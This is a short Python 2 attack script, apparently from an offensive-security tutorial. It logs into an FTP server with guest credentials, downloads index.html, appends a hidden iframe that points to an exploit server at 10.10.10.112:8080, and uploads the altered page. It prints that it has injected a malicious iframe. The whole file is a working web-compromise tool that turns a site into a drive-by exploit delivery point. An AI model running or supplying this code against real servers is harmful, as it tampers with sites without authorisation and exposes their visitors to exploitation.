#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print '[+] Downloaded Page: ' + page

    f.write(redirect)
    f.close()
    print '[+] Injected Malicious IFrame on: ' + page

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Uploaded Injected Page: ' + page


host = '192.168.95.179'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src='+\
  '"http:\\\\10.10.10.112:8080\\exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)
